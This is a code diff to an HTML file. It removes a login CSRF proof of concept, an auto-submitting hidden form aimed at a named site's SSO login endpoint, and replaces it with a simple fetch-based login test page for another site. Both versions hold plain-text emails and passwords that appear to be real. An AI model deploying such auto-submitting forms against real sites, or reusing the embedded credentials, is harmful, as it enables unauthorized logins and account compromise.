@@ -1,31 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF PoC</title>
-</head>
+<html>
+<head><meta charset="utf-8"><title>Login Demo</title></head>
 <body>
-    <h1>Form CSRF PoC</h1>
-    <form id="csrfForm" method="POST" action="https://login.medscape.com/login/sso/login?lang=en&ac=401&client=205502&scode=msp&urlCache=">
-        <input type="hidden" name="userId" value="aswinps1922001@gmail.com">
-        <input type="hidden" name="password" value="Hsr@1234">
-        <input type="hidden" name="prevFormUrl" value="fpf">
-        <input type="hidden" name="isSocialEnable" value="true">
-        <input type="hidden" name="linkedSites" value="">
-        <input type="hidden" name="urlCache" value="">
-        <input type="hidden" name="spa" value="">
-        <input type="hidden" name="facilitatedUrl" value="">
-        <input type="hidden" name="client" value="205502">
-        <input type="hidden" name="lang" value="en">
-        <input type="hidden" name="scode" value="msp">
-    </form>
+  <input id="email" placeholder="email" value="prasad@techbench.in">
+  <input id="password" type="password" placeholder="password" value="o136o5pnVJwLk4Db7ykm6T">
+  <button id="loginBtn">Log in</button>
+  <pre id="out"></pre>
 
-    <script>
-        // Auto-submit the form when page loads
-        window.onload = function() {
-            document.getElementById('csrfForm').submit();
-        };
-    </script>
+  <script>
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+      const out = document.getElementById('out');
+      out.textContent = 'sending...';
+      try {
+        const res = await fetch('https://techbench.in/apigateway/login/', {  // <-- 1. URL
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+            // 'Authorization': 'Bearer <token>'   // <-- only if needed
+          },
+          credentials: 'same-origin',   // <-- 3. 'include' for cross-origin cookies
+          body: JSON.stringify({         // <-- 2. body
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value
+          })
+        });
+        const data = await res.json();
+        out.textContent = `status: ${res.status}\n\n` + JSON.stringify(data, null, 2);
+      } catch (err) {
+        out.textContent = 'error: ' + err.message;
+      }
+    });
+  </script>
 </body>
 </html>
